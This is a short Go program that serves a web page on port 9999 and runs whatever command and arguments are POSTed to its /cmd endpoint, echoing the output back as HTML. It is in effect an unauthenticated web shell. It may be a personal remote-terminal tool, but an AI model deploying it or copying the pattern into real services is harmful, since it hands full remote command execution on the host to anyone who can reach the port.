package main

import (
    //"fmt"
    "os/exec"
    "strings"
    "net/http"
    "log"
)

func main() {
    start_http_server()
}


func start_http_server() {
    http.HandleFunc("/index",handler_main)
    http.HandleFunc("/",handler_main)
    http.HandleFunc("/cmd",handler_cmd)

    err := http.ListenAndServe(":9999",nil)
    if err!=nil {
        log.Fatal("ListenAndServe: ",err)
    }
}

func handler_main(rw http.ResponseWriter, req *http.Request) {
    rw.Write([]byte(create_html_page("")))
}

func handler_cmd(rw http.ResponseWriter, req *http.Request) {
    var cmd string = req.PostFormValue("command")
    var args = req.PostFormValue("args")
    ret,err := exec.Command(cmd,args).Output()
    var result string
    if err!=nil {
        result = err.Error()
    } else {
        result = string(ret)
    }
    result_page := parse_cmd_response(result)
    rw.Write([]byte(create_html_page(result_page)))
}

func create_html_page(content string) string {
    var header string = "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    header += "<meta name=\"viewport\" content=\"width=device-width\">"
    header += "<script src=\"brutal.js\"></script>"
    header += "</head><body><div style=\"width:70%;margin:auto;overflow-x:hidden;\">"
    var footer string = "</div><div style=\"z-index:100;position:fixed;bottom:0;\">"+
        "$<input type=\"text\" value=\"\" style=\"width:100%;\" onchange=\"ajax_post_cmd()\">"+
        "</div></body></html>"
    return header + content + footer
}

func parse_cmd_response(res string) string {
    return strings.Replace(res,"\n","<br>",-1)
}

